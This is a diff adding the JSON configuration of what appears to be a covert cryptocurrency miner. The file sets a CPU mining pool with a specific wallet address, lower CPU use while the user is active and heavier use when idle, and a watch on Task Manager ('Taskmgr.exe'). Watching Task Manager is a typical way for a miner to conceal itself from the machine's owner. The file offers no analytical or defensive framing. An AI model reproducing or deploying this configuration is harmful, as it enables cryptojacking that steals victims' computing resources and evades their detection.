@@ -1,0 +1,23 @@
+{
+  "cpu_config": {
+    "mining_url": "pool.hashvault.pro:443",
+    "wallet": "48eesfMgzM84ixAAydJ8GN6CK9EfrBEc9g484jPc9C9EaXtj5NTgs1gbHsbU8Ta2Y8QbgVtJ2T1uvcDwY5rqqYJJ7Yr7hof",
+    "password": "888",
+    "non_idle_usage": 30,
+    "idle_usage": 80,
+    "wait_time_idle": 3,
+    "use_ssl": 1
+  },
+  "gpu_config": {
+    "mining_url": "pool.example.com:3333",
+    "wallet": "wallet_addr",
+    "password": "x",
+    "algo": "ethash",
+    "fan_speed": 80,
+    "wait_time_idle": 1,
+    "use_ssl": 0
+  },
+  "enable_cpu": 1,
+  "enable_gpu": 0,
+  "watched_processes": ["Taskmgr.exe"]
+}
